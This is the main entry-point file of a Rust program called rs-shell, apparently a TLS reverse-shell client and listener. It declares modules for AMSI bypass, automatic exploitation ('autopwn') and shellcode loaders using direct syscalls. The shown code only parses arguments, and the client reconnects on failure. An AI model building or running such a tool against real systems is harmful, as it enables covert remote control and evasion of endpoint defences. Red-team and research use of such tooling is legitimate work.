mod utils {
    pub mod structures;
    pub mod tools;
}
mod amsi_bypass;
mod autopwn;
#[cfg_attr(target_family = "unix", path = "client_linux.rs")]
#[cfg_attr(target_family = "windows", path = "client_windows.rs")]
mod client;
mod loader;
mod loader_syscalls;
mod server;

use crate::client::client;
use crate::server::server;
use clap::{Arg, Command};
use log::LevelFilter;
use simple_logger::SimpleLogger;
use std::error::Error;
#[cfg(target_family = "windows")]
use syscalls::syscall;

fn main() -> Result<(), Box<dyn Error>> {
    SimpleLogger::new()
        .without_timestamps()
        .with_colors(true)
        .init()
        .unwrap();
    ::log::set_max_level(LevelFilter::Info);

    let args = Command::new("rs-shell")
        .author("BlackWasp")
        .version("0.1.5")
        .after_help("In a session, type 'help' for advanced integrated commands")
        .arg(
            Arg::new("side")
                .short('s')
                .long("side")
                .required(true)
                .value_parser([
                    clap::builder::PossibleValue::new("c"),
                    clap::builder::PossibleValue::new("l"),
                ])
                .help("launch the client or the listener"),
        )
        .arg(
            Arg::new("ip")
                .short('i')
                .long("ip")
                .required(true)
                .help("IP address to bind to for the listener, or to connect to for the client"),
        )
        .arg(
            Arg::new("port")
                .short('p')
                .long("port")
                .required(true)
                .help("port address to bind to for the listener, or to connect to for the client"),
        )
        .arg(
            Arg::new("cert_path")
                .long("cert-path")
                .required_if_eq("side", "l")
                .help("path of the TLS certificate (in PFX or PKCS12 format) for the server"),
        )
        .arg(
            Arg::new("cert_pass")
                .long("cert-pass")
                .required_if_eq("side", "l")
                .help("password of the TLS certificate for the server"),
        )
        .get_matches();

    if args.get_one::<String>("side").unwrap() == "l" {
        match server(
            args.get_one::<String>("ip").unwrap().as_str(),
            args.get_one::<String>("port")
                .unwrap()
                .parse::<u16>()
                .unwrap(),
            args.get_one::<String>("cert_path").unwrap().as_str(),
            args.get_one::<String>("cert_pass").unwrap().as_str(),
        ) {
            Ok(_) => (),
            Err(r) => {
                log::error!("Error starting the server : {}", r);
                return Err(r);
            }
        }
    } else if args.get_one::<String>("side").unwrap() == "c" {
        match client(
            args.get_one::<String>("ip").unwrap().as_str(),
            args.get_one::<String>("port").unwrap().as_str(),
        ) {
            Ok(_) => (),
            Err(r) => {
                log::debug!(
                    "Error during client execution : {}. Attempt to restart it",
                    r
                );
                match client(
                    args.get_one::<String>("ip").unwrap().as_str(),
                    args.get_one::<String>("port").unwrap().as_str(),
                ) {
                    Ok(_) => (),
                    Err(r) => {
                        log::debug!("Error still present : {}", r);
                        return Err(r);
                    }
                }
            }
        }
    }

    Ok(())
}
